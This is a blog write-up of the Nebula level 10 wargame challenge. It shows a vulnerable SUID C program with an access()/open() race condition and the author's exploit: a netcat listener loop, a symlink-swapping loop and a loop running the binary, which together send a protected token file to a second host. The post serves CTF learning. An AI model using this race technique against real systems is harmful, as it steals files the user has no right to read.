<!DOCTYPE html>
<html lang="en-US">
	<head>
		<meta content='width=device-width, initial-scale=1, maximum-scale=1' name='viewport'/>
		<link href="//fonts.googleapis.com/css?family=Raleway:400,700%7COpen+Sans:400,700,400italic" media="all" rel="stylesheet" type="text/css">
		<link href='//maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css' rel='stylesheet'/>
		<meta content='text/html; charset=UTF-8' http-equiv='Content-Type'/>
		<meta content='blogger' name='generator'/>
		<link href='http://test.andreko.net//favicon.ico' rel='icon' type='image/x-icon'/>
		<link href='http://test.andreko.net/' rel='canonical'/>
		
		
		<title>Exploit Exercises - Nebula 10</title>
		<meta content='YOUR DESCRIPTION HERE' name='description'/>
		<meta content='YOUR KEYWORDS HERE' name='keywords'/>
		<meta content='Facebook App ID here' property='fb:app_id'/>
		<meta content='Facebook Admin ID here' property='fb:admins'/>
		
		<meta content='@mandreko' name='twitter:site'/>
		<meta content='@mandreko' name='twitter:creator'/>
		
		<link type="text/css" rel="stylesheet" href="/css/main.css" />
		<script src='https://ajax.googleapis.com/ajax/libs/jquery/1.11.0/jquery.min.js' type='text/javascript'></script>
		
		<script type="text/javascript">
			var _gaq=[['_setAccount','UA-25280110-1'],['_trackPageview']];
			(function(d,t){var g=d.createElement(t),s=d.getElementsByTagName(t)[0];
			g.src=('https:'==location.protocol?'//ssl':'//www')+'.google-analytics.com/ga.js';
			s.parentNode.insertBefore(g,s)}(document,'script'));
		</script>
		
	</head>
	<body class='index'>
	
	<div class='head-wrap'>
		<div class='row' id='header-wrappers'>
			<div class='headerleft'>
				<div class='headerleft section' id='headerleft'>
					<div class='widget Header' data-version='1' id='Header1'>
						<div id='header-inner'>
							<a href='/' style='display: block'><h1 style='display:none'></h1>
								<img alt="Logo" height="55px; " id="Header1_headerimg" src="/img/logo.png" style="display: block" width="311px; ">
							</a>
						</div>
					</div>
				</div>
			</div>
			<div style='clear: both;'></div>
		</div>
	</div>
	<div class='navi-menu'>
		<div class='nav-menu section' id='Navigation Menu' name='Navigation Menu'>
			<div class='widget LinkList' data-version='1' id='LinkList100'>
				<div class='widget-content'>
					<ul id='nav' itemscope='' itemtype='http://schema.org/SiteNavigationElement'>
						<li itemprop='name'><a href='http://test.andreko.net/' itemprop='url'>HOME</a></li>
						<li itemprop='name'><a href='http://test.andreko.net//categories' itemprop='url'>CATEGORIES</a></li>
						<li itemprop='name'><a href='#' itemprop='url'>ARCHIVE</a></li>
						<li itemprop='name'><a href='#' itemprop='url'>RESUME</a></li>
					</ul>
					<select class="selectnav" id="selectnav2">
						<option value="">Menu</option>
						<option value="http://test.andreko.net/">HOME</option>
						<option value="http://test.andreko.net//categories">CATEGORIES</option>
						<option value="#">ARCHIVE</option>
						<option value="#">RESUME</option>
					</select>
				</div>
			</div>
		</div>
		<div class='top-bar-social blue section' id='header social widget' name='Top Social Widget'>
			<div class='widget LinkList' data-version='1' id='LinkList230'>
				<div class='widget-content'>
					<ul id='social'>
						
							<li><a class='facebook' href='https://www.facebook.com/mattandreko' title='facebook'></a></li>
						
						
							<li><a class='twitter' href='https://www.twitter.com/mandreko' title='twitter'></a></li>
						
						
							<li><a class='gplus' href='https://plus.google.com/mandreko' title='gplus'></a></li>
						
						
							<li><a class='linkedin' href='https://www.linkedin.com/mattandreko' title='linkedin'></a></li>
						
						
							<li><a class='stack-overflow' href='http://stackoverflow.com/story/mattandreko' title='stack-overflow'></a></li>
						
						
							<li><a class='github' href='https://www.github.com/mandreko' title='github'></a></li>
						
						
							<li><a class='instagram' href='https://www.instagram.com/mandreko' title='instagram'></a></li>
						
					</ul>
				</div>
			</div>
		</div>
		<div style='clear: both;'></div>
	</div>
	
	<div style='clear: both;'></div>
	<div id="outer-wrapper" class="index home">


<div class='row' id='content-wrapper'>
    <div id='main-wrapper'>
      <div class='main section' id='main'>
      


        <div id="main">
          <div id="content">
            <div>
              <article class="hentry" role="article">

                
                

                <div class="entry-content">
                  
                  
                  <p><a href="http://exploit-exercises.com/nebula/level10">Challenge 10</a> is another nostalgic one for me. Back when I was first starting with linux, I remember reading about overflows and race conditions.  This challenge is the latter, a race condition.</p>

<!-- more -->

<p>We&rsquo;re given a C/C++ app to exploit:</p>

<pre><code>#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;stdio.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;errno.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;netinet/in.h&gt;
#include &lt;string.h&gt;

int main(int argc, char **argv)
{
 char *file;
 char *host;

 if(argc &lt; 3) {
  printf(&quot;%s file host\n\tsends file to host if you have access to it\n&quot;, argv[0]);
  exit(1);
 }

 file = argv[1];
 host = argv[2];

 if(access(argv[1], R_OK) == 0) {
  int fd;
  int ffd;
  int rc;
  struct sockaddr_in sin;
  char buffer[4096];

  printf(&quot;Connecting to %s:18211 .. &quot;, host); fflush(stdout);

  fd = socket(AF_INET, SOCK_STREAM, 0);

  memset(&amp;sin, 0, sizeof(struct sockaddr_in));
  sin.sin_family = AF_INET;
  sin.sin_addr.s_addr = inet_addr(host);
  sin.sin_port = htons(18211);

  if(connect(fd, (void *)&amp;sin, sizeof(struct sockaddr_in)) == -1) {
   printf(&quot;Unable to connect to host %s\n&quot;, host);
   exit(EXIT_FAILURE);
  }

#define HITHERE &quot;.oO Oo.\n&quot;
  if(write(fd, HITHERE, strlen(HITHERE)) == -1) {
   printf(&quot;Unable to write banner to host %s\n&quot;, host);
   exit(EXIT_FAILURE);
  }
#undef HITHERE

  printf(&quot;Connected!\nSending file .. &quot;); fflush(stdout);

  ffd = open(file, O_RDONLY);
  if(ffd == -1) {
   printf(&quot;Damn. Unable to open file\n&quot;);
   exit(EXIT_FAILURE);
  }

  rc = read(ffd, buffer, sizeof(buffer));
  if(rc == -1) {
   printf(&quot;Unable to read from file: %s\n&quot;, strerror(errno));
   exit(EXIT_FAILURE);
  }

  write(fd, buffer, rc);

  printf(&quot;wrote file!\n&quot;);

 } else {
  printf(&quot;You don't have access to %s\n&quot;, file);
 }
}
</code></pre>

<p>The problem with this code, is that it first checks to see if the user running the problem has access to the file (on line 24).  It then assumes for the rest of the execution of the program, that we <em>still</em> have access to it.  The point of this exercise is to trick the program by switching out the file while the program is running.  Hence a race condition.</p>

<p>To set this one up, I used 2 machines, my Nebula machine, and another VM running <a href="http://www.backtrack-linux.org">BackTrack Linux</a>.  Any Linux should do, I just had this one handy.  The only requirement is <a href="http://nc110.sourceforge.net">NetCat</a>.</p>

<p>On the BackTrack machine (10.1.1.132 for me), I ran 2 terminals.  The first contained:</p>

<pre><code>root@bt:~# while :; do nc -l -p 18211 &gt;&gt; out.txt; done
</code></pre>

<p>The second contained:</p>

<pre><code>root@bt:~# tail -f out.txt | grep -v &quot;.oO Oo.&quot;
</code></pre>

<p>I ran both of these so that the first one would continuously open up a listening socket connection on port 18211 (per the vulnerable program), and append all information received to &ldquo;out.txt&rdquo;.  The second command would continuously watch out.txt and output any lines that didn&rsquo;t have the little banner the vulnerable program uses.  That way I didn&rsquo;t get spammed with trash I didn&rsquo;t care about.</p>

<p>Now on the Nebula machine, I ran 2 more terminals.  In the first, I ran:</p>

<pre><code>level10@nebula:~$ while :; do ln -fs /tmp/token /tmp/token10; ln -fs /home/flag10/token /tmp/token10; done
</code></pre>

<p>And the second:</p>

<pre><code>level10@nebula:~$ while :; do nice -n 20 ./flag10 /tmp/token10 10.1.1.132; done
</code></pre>

<p>These commands are pretty simple to pick apart.  They both are endless loops, just like the earlier NetCat session.  The first would create a symbolic link to /tmp/token10.  However, it would alternate between using /tmp/token (a blank file I made), and /home/flag10/token.  The idea is to try using /tmp/token when the access() is called in the vulnerable program, but then have /home/flag10/token be there when we actually send the file.  It&rsquo;s unreliable, but will eventually work.  The second command runs the vulnerable program, passing it the symlinked file and the BackTrack IP.  I used <a href="http://linux.about.com/library/cmd/blcmdl1_nice.htm">nice</a>, to lower the priority as low as possible, so that hopefully the symlinking loop would operate faster.</p>

<p>When you have all of these terminals running, it&rsquo;s just a matter of time before you get the token sent to you.  Some iterations of flag10 will fail, some will succeed.  Just watch the second terminal on the BackTrack machine, and eventually you&rsquo;ll see the token come over.  You should see this flying across the screen:</p>

<blockquote>
<p>615a2ce1-b2b5-4c76-8eed-8aa5c4015c27</p>
</blockquote>

<p>Just stop all the terminals, and you should be done with this challenge.  I did learn quite a bit on this one, as it was honestly my first race condition I&rsquo;d ever had to exploit.  My original methodology was to use <a href="http://www.gnu.org/s/gdb/">GDB</a> to start the program, and set a breakpoint after the initial access() was done.  Then switch the file manually, and resume.  This worked brilliantly, however I learned that when dealing with SUID programs, you can&rsquo;t use GDB on them, unless you run GDB as root.  This is a security design of Linux.  So instead, I had to go with the quirky commands.  I&rsquo;m still interested in seeing if it could be done with a custom C++ app which would invoke flag10, and attach to the process using ptrace to duplicate my GDB idea.  I just don&rsquo;t know if it&rsquo;ll work or not.</p>

                </div>
                
              </article>
            </div>
          </div>
        </div>


      
      </div>
    </div>
    
    <div id='sidebar-wrapper'>
      <div class='sidebar ready-widget section' id='sidebar'>
        <div class='widget HTML' data-version='1' id='HTML3'>
	<h2 class='title'>Author</h2>
	<div class='widget-content'>
		<div class="sidebar_about_author">
			<div class="inner_wrapper">
				<div class="aboutme-img">
					<img alt="Author" class="img-responsive" height="388px" src="http://test.andreko.net/img/mattandreko_photo.jpg" title="Author (Matt Andreko)" width="300px">
				</div>
			</div>
			<div class="aboutme-info">
				<h4>Matt Andreko</h4>
				<p>Security Consultant</p>
			</div>
		</div>
	</div>
	<div class='clear'></div>
</div>
        <div class='RecentPosts' data-version='1' id='RecentPosts1'>
	<h2>Recent Posts</h2>
	<div class='widget-content recent-posts'>
		<ul>
			
			<li>
				<div class='item-thumbnail-only'>
					<div class='item-thumbnail'>
						<a href='http://test.andreko.net/2014/12/17/compiling-sslscan-with-sslv2-support-on-osx/'>
							<img alt='Compiling SSLScan with SSLv2 support on OSX' border='0' height='72' src='http://test.andreko.net/img/sslscan_apple.png' width='72'/>
						</a>
					</div>
					<div class='item-title'><a href='http://test.andreko.net/2014/12/17/compiling-sslscan-with-sslv2-support-on-osx/'>Compiling SSLScan with SSLv2 support on OSX</a></div>
				</div>
				<div style='clear: both;'></div>
			</li>
			
			<li>
				<div class='item-thumbnail-only'>
					<div class='item-thumbnail'>
						<a href='http://test.andreko.net/2014/08/01/burp-icon-in-osx/'>
							<img alt='Burp Icon in OSX' border='0' height='72' src='http://test.andreko.net/img/automator_burp.png' width='72'/>
						</a>
					</div>
					<div class='item-title'><a href='http://test.andreko.net/2014/08/01/burp-icon-in-osx/'>Burp Icon in OSX</a></div>
				</div>
				<div style='clear: both;'></div>
			</li>
			
			<li>
				<div class='item-thumbnail-only'>
					<div class='item-thumbnail'>
						<a href='http://test.andreko.net/2014/01/13/backdoor-modules-for-netgear-linksys-and-other-routers/'>
							<img alt='Backdoor Modules for Netgear, Linksys, and Other Routers' border='0' height='72' src='http://test.andreko.net/img/backdoor_all_the_routers.jpg' width='72'/>
						</a>
					</div>
					<div class='item-title'><a href='http://test.andreko.net/2014/01/13/backdoor-modules-for-netgear-linksys-and-other-routers/'>Backdoor Modules for Netgear, Linksys, and Other Routers</a></div>
				</div>
				<div style='clear: both;'></div>
			</li>
			
			<li>
				<div class='item-thumbnail-only'>
					<div class='item-thumbnail'>
						<a href='http://test.andreko.net/2013/11/20/brainpan2/'>
							<img alt='Brainpan2' border='0' height='72' src='http://test.andreko.net/img/brainpan.jpg' width='72'/>
						</a>
					</div>
					<div class='item-title'><a href='http://test.andreko.net/2013/11/20/brainpan2/'>Brainpan2</a></div>
				</div>
				<div style='clear: both;'></div>
			</li>
			
			<li>
				<div class='item-thumbnail-only'>
					<div class='item-thumbnail'>
						<a href='http://test.andreko.net/2013/06/18/canon-y-u-no-security/'>
							<img alt='Canon, Y U NO Security?' border='0' height='72' src='http://test.andreko.net/img/y-u-no-guy.jpg' width='72'/>
						</a>
					</div>
					<div class='item-title'><a href='http://test.andreko.net/2013/06/18/canon-y-u-no-security/'>Canon, Y U NO Security?</a></div>
				</div>
				<div style='clear: both;'></div>
			</li>
			
		</ul>
		<div class='clear'></div>
	</div>
</div>

        <div class='widget Label' data-version='1' id='Label1'>
	<h2>Top Categories</h2>
	<div class='widget-content cloud-label-widget-content'>
		
			<span class='label-size label-size-5'>
				<a dir='ltr' href='/tags/hacking'>hacking</a>
			</span>
		
			<span class='label-size label-size-5'>
				<a dir='ltr' href='/tags/wargames'>wargames</a>
			</span>
		
			<span class='label-size label-size-5'>
				<a dir='ltr' href='/tags/linux'>linux</a>
			</span>
		
			<span class='label-size label-size-5'>
				<a dir='ltr' href='/tags/exploit-exercises'>exploit-exercises</a>
			</span>
		
			<span class='label-size label-size-5'>
				<a dir='ltr' href='/tags/protostar'>protostar</a>
			</span>
		
			<span class='label-size label-size-5'>
				<a dir='ltr' href='/tags/overthewire'>overthewire</a>
			</span>
		
			<span class='label-size label-size-5'>
				<a dir='ltr' href='/tags/natas'>natas</a>
			</span>
		
			<span class='label-size label-size-5'>
				<a dir='ltr' href='/tags/nebula'>nebula</a>
			</span>
		
		<div class='clear'></div>
	</div>
</div>
      </div>
    </div>
    <div style='clear: both;'></div>
  </div>





		</div>
		
		<div id='w2t_footer'>
			<div class='w2t-copy-container row'>
				<div class='w2t_footer_copyright'>
					Copyright &copy;
					<script type='text/javascript'>
						var creditsyear = new Date();
						document.write(creditsyear.getFullYear());
					</script>
					Matt Andreko. All Rights Reserved
				</div>
			</div>
		</div>
		
		
			
				<script type="text/javascript">
	var disqus_shortname = 'mattandreko';
	var disqus_script = 'count.js';

	(function () {
		var dsq = document.createElement('script'); 
		dsq.type = 'text/javascript'; 
		dsq.async = true;
		dsq.src = '//' + disqus_shortname + '.disqus.com/' + disqus_script;
		(document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
	}());
</script>
			
		
	</body>
</html>

